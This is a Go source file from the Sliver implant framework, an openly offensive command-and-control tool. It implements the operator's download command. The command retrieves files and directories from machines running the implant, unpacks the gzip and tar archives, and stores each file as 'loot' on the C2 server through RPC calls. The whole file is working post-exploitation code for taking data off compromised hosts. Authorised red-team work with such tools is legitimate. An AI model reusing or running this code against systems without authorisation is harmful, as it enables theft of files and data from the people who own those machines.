package filesystem

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"os"
	"path"
	"path/filepath"
	"strings"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/command/loot"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	"google.golang.org/protobuf/proto"

	"github.com/desertbit/grumble"
)

// DownloadCmd - Download a file from the remote system
func DownloadCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	remotePath := ctx.Args.String("remote-path")
	localPath := ctx.Args.String("local-path")

	src := remotePath
	fileName := filepath.Base(src)
	var dst string

	if ctx.Flags.Bool("loot") {
		// Put something in here for when the message below is output
		dst = "loot"
	} else {
		// If this download is not being looted, make sure the local path exists
		dst, _ := filepath.Abs(localPath)
		fi, err := os.Stat(dst)
		if err != nil && !os.IsNotExist(err) {
			con.PrintErrorf("%s\n", err)
			return
		}
		if err == nil && fi.IsDir() {
			dst = path.Join(dst, fileName)
		}
	}

	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("%s -> %s", fileName, dst), ctrl)
	download, err := con.Rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Request: con.ActiveTarget.Request(ctx),
		Path:    remotePath,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	if download.Response != nil && download.Response.Async {
		con.AddBeaconCallback(download.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, download)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			if ctx.Flags.Bool("loot") {
				LootDownload(download, ctx, con)
			} else {
				PrintDownload(download, ctx, con)
			}
		})
		con.PrintAsyncResponse(download.Response)
	} else {
		if ctx.Flags.Bool("loot") {
			LootDownload(download, ctx, con)
		} else {
			PrintDownload(download, ctx, con)
		}
	}
}

// PrintDownload - Print the download response, and save file to disk
func PrintDownload(download *sliverpb.Download, ctx *grumble.Context, con *console.SliverConsoleClient) {
	if download.Response != nil && download.Response.Err != "" {
		con.PrintErrorf("%s\n", download.Response.Err)
		return
	}

	remotePath := ctx.Args.String("remote-path")
	localPath := ctx.Args.String("local-path")

	src := remotePath
	fileName := filepath.Base(src)
	dst, _ := filepath.Abs(localPath)
	fi, err := os.Stat(dst)
	if err != nil && !os.IsNotExist(err) {
		con.PrintErrorf("%s\n", err)
		return
	}
	if err == nil && fi.IsDir() {
		dst = path.Join(dst, fileName)
	}
	if _, err := os.Stat(dst); err == nil {
		overwrite := false
		prompt := &survey.Confirm{Message: "Overwrite local file?"}
		survey.AskOne(prompt, &overwrite, nil)
		if !overwrite {
			return
		}
	}
	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			con.PrintErrorf("Decoding failed %s", err)
			return
		}
	}
	dstFile, err := os.Create(dst)
	if err != nil {
		con.PrintErrorf("Failed to open local file %s: %s\n", dst, err)
		return
	}
	defer dstFile.Close()
	n, err := dstFile.Write(download.Data)
	if err != nil {
		con.PrintErrorf("Failed to write data %v\n", err)
	} else {
		con.PrintInfof("Wrote %d bytes to %s\n", n, dstFile.Name())
	}
}

func createLootMessage(fileName string, data []byte) *clientpb.Loot {
	// Determine if the data is text or not
	var lootFileType clientpb.FileType

	if loot.IsText(data) {
		lootFileType = clientpb.FileType_TEXT
	} else {
		lootFileType = clientpb.FileType_BINARY
	}

	lootMessage := &clientpb.Loot{
		Name:     fileName,
		Type:     clientpb.LootType_LOOT_FILE,
		FileType: lootFileType,
		File: &commonpb.File{
			Name: fileName,
			Data: data,
		},
	}

	return lootMessage
}

func sendLootMessage(loot *clientpb.Loot, con *console.SliverConsoleClient) {
	control := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Sending looted file (%s) to the server...", loot.Name), control)

	loot, err := con.Rpc.LootAdd(context.Background(), loot)
	control <- true
	<-control
	if err != nil {
		con.PrintErrorf("%s\n", err)
	}

	con.Printf("Successfully looted %s (ID: %s)\n", loot.Name, loot.LootID)
	return
}

func LootDownload(download *sliverpb.Download, ctx *grumble.Context, con *console.SliverConsoleClient) {
	// Was the download successful?
	if download.Response != nil && download.Response.Err != "" {
		con.PrintErrorf("%s\n", download.Response.Err)
		return
	}

	/*  Construct everything needed to send the loot to the server
	If this is a directory, we will process each file individually
	*/

	var err error = nil

	// First decode the downloaded data if required
	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			con.PrintErrorf("Decoding failed %s", err)
			return
		}
	}

	// Let's handle the simple case of a file first
	if !download.IsDir {
		// filepath.Base does not deal with backslashes correctly in Windows paths, so we have to standardize the path to forward slashes
		downloadPath := strings.ReplaceAll(download.Path, "\\", "/")
		lootMessage := createLootMessage(filepath.Base(downloadPath), download.Data)
		sendLootMessage(lootMessage, con)
	} else {
		// We have to decompress the gzip file first
		decompressedDownload, err := gzip.NewReader(bytes.NewReader(download.Data))

		if err != nil {
			con.PrintErrorf("Could not decompress downloaded data: %s", err)
			return
		}

		/*
			Directories are stored as tar-ed gzip archives.
			We have gotten rid of the gzip part, now we have to sort out the tar
		*/
		tarReader := tar.NewReader(decompressedDownload)

		// Keep reading until we reach the end
		for {
			entryHeader, err := tarReader.Next()
			if err == io.EOF {
				// We have reached the end of the tar archive
				break
			}

			if err != nil {
				// Something is wrong with this archive. Stop reading.
				break
			}

			if entryHeader == nil {
				/*
					If the entry is nil, skip it (not sure when this would happen,
						but we do not want to attempt operations on something that is nil)
				*/
				continue
			}

			if entryHeader.Typeflag == tar.TypeDir {
				// Keep going to dig into the directory
				continue
			}
			// The implant should have only shipped us files (the implant resolves symlinks)

			// Create a loot message for this file and ship it
			/* Using io.ReadAll because it reads until EOF. We have already read the header, so the next EOF should
			be the end of the file
			*/
			fileData, err := io.ReadAll(tarReader)
			if err == nil {
				lootMessage := createLootMessage(filepath.Base(entryHeader.Name), fileData)
				sendLootMessage(lootMessage, con)
			}
		}
	}

}
